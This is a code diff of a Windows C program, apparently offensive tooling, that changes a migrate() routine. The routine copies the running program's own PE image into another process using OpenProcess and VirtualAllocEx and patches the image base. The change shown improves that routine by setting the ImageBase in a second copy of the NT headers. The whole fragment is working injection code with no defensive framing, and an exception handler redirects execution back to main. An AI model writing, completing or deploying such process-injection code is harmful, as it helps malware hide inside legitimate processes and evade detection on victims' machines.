@@ -22,6 +22,7 @@ LONG WINAPI hand(EXCEPTION_POINTERS *pExceptionInfo){
     pExceptionInfo->ContextRecord->Rip = (unsigned long long)main;
     return EXCEPTION_CONTINUE_EXECUTION;
 }
+
 int migrate(int pid){
 	// Get current image's base address
 	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)revival;
@@ -30,11 +31,13 @@ int migrate(int pid){
 	// Allocate a new memory block and copy the current PE image to this new memory block
 	PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
 	memcpy(localImage, revival, ntHeader->OptionalHeader.SizeOfImage);
-
+    PIMAGE_NT_HEADERS ntHeader2 = (PIMAGE_NT_HEADERS)((DWORD_PTR)localImage + dosHeader->e_lfanew);
+    
 	// Open the target process - this is process we will be injecting this PE into
 	HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, pid);
 	
 	PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
+	ntHeader2->OptionalHeader.ImageBase = (unsigned long long)targetImage;
 	//patch the ImageBase as GetModuleHandleA returns parent image
     *(unsigned long long*)(localImage+deltaIB) = (unsigned long long)targetImage;
 	// Calculate delta between addresses of where the image will be located in the target process and where it's located currently
